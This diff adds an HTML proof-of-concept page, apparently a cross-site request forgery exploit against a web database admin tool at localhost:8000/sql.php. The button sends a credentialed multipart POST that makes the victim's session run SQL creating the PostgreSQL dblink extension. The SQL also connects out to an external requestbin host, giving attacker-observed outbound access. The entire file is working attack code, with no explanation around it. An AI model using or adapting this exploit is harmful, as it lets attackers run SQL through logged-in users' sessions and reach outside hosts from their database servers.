@@ -1,0 +1,48 @@
+<html>
+<body>
+<script>
+function submitRequest() {
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", "http:\/\/localhost:8000\/sql.php", true);
+	xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+	xhr.setRequestHeader("Accept-Language", "en-GB,en;q=0.5");
+	xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------317222262731323");
+	xhr.withCredentials = true;
+	var body = "-----------------------------317222262731323\r\n" +
+		"Content-Disposition: form-data; name=\"query\"\r\n" +
+		"\r\n" +
+		"CREATE EXTENSION dblink;\r\n" +
+		"SELECT dblink_connect(\'host=mydatahere.b940ab686a17804777c0.d.requestbin.net user=postgres password=password dbname=dvdrental\');\r\n" +
+		"-----------------------------317222262731323\r\n" +
+		"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n" +
+		"\r\n" +
+		"2097152\r\n" +
+		"-----------------------------317222262731323\r\n" +
+		"Content-Disposition: form-data; name=\"script\"; filename=\"\"\r\n" +
+		"Content-Type: application/octet-stream\r\n" +
+		"\r\n" +
+		"\r\n" + "-----------------------------317222262731323\r\n" +
+		"Content-Disposition: form-data; name=\"execute\"\r\n" +
+		"\r\n" +
+		"Execute\r\n" +
+		"-----------------------------317222262731323\r\n" +
+		"Content-Disposition: form-data; name=\"server\"\r\n" +
+		"\r\n" +
+		"localhost:5432:allow\r\n" +
+		"-----------------------------317222262731323\r\n" +
+		"Content-Disposition: form-data; name=\"database\"\r\n" +
+		"\r\n" +
+		"postgres\r\n" +
+		"-----------------------------317222262731323--\r\n";
+	var aBody = new Uint8Array(body.length);
+	for (var i = 0; i < aBody.length; i++) {
+		aBody[i] = body.charCodeAt(i);
+	}
+	xhr.send(new Blob([aBody]));
+}
+</script>
+<form action="#">
+	<input type="button" value="Submit request" onclick="submitRequest();" />
+</form>
+</body>
+</html>
